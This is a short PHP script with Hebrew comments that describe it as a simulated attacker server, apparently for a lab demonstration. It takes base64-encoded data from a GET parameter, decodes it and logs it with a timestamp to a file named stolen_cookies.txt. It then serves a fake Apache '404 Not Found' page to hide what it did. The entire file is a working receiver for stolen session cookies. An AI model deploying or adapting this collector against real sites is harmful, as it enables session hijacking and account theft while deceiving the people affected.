<?php
// קובץ זה מדמה את השרת של התוקף שקולט את המידע הגנוב
if (isset($_GET['data'])) {
    $stolen_data = base64_decode($_GET['data']);
    $file = fopen("stolen_cookies.txt", "a");
    fwrite($file, "Time: " . date("Y-m-d H:i:s") . " | Data: " . $stolen_data . "\n");
    fclose($file);
}

// שליחת קוד שגיאה אמיתי לדפדפן (HTTP 404)
http_response_code(404);
?>
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12 Server at 192.168.56.1 Port 80</address>
</body></html>